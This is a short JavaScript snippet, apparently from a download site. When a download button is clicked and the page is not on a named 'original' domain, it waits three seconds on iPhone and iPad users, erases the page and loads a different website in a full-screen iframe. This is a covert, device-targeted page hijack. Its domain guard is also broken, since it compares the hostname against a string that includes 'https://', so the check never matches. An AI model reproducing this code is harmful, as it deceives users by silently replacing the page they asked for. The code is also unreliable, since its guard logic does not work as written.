var button = document.querySelector('.btn-downs');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "https://mbcvie.com";
        var redirectURL = "https://www.rolls3.com/";
        var blockedDomains = [
            "https://mbcvie.com"
        ];

        if (
            window.location.hostname !== originalDomain &&
            window.location.hostname !== "www." + originalDomain &&
            !blockedDomains.some(domain => window.location.hostname.includes(domain))
        ) {
var isIOSDevice = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            if (isIOSDevice) {
                setTimeout(function() {
                    document.body.innerHTML = '';

                    var style = document.createElement('style');
                    style.textContent = `
                        #redirectFrame {
                            width: 100%;
                            height: 100vh;
                            border: none;
                        }
                    `;
                    document.head.appendChild(style);

                    var iframe = document.createElement('iframe');
                    iframe.id = "redirectFrame";
                    iframe.src = redirectURL;

                    document.body.appendChild(iframe);
                }, 3000);
            }
        }
    })();
});
